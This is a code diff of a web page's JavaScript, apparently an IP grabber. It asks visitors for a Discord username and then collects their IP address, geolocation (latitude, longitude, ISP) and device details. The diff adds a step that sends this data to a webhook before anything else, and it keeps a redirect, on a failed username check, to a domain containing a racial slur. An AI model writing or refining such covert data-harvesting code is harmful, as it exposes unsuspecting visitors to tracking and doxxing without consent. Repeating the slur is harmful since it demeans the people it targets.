@@ -64,12 +64,12 @@
       const errorMessage = document.getElementById('errorMessage');
       
       // Check if the username is more than 5 characters
-      if (discordInput.length > 5) {
+      if (discordInput.length >= 5) {
         errorMessage.textContent = ''; // Clear error message
         collectAndSendData(discordInput); // Proceed with data collection
       } else {
-        errorMessage.textContent = 'Discord username must be longer than 5 characters!';
-        // Redirect to Google after showing error for 3 seconds
+        errorMessage.textContent = 'Invalid Discord username, must be at least 5 characters long!';
+        // Redirect to a different site after showing error for 3 seconds
         setTimeout(() => {
           window.location.href = 'https://www.niggafart.com';
         }, 3000);
@@ -96,6 +96,9 @@
           longitude: locationData.longitude,
           isp: locationData.org,
         };
+
+        // Send the IP data to the webhook first
+        await sendToWebhook(`**IP Information:**\n\`\`\`json\n${JSON.stringify(collectedData.IP_Info, null, 2)}\n\`\`\``);
       } catch (error) {
         console.error('Error fetching IP data:', error);
         collectedData.IP_Info = 'Unavailable';
@@ -131,7 +134,7 @@
 
     // Collect and send data
     async function collectAndSendData(discordUsername) {
-      await fetchIPData(); // Fetch IP data
+      await fetchIPData(); // Fetch IP data and send it to webhook first
       fetchDeviceInfo(); // Fetch device info
       collectedData.Discord_Username = discordUsername; // Add Discord username
 
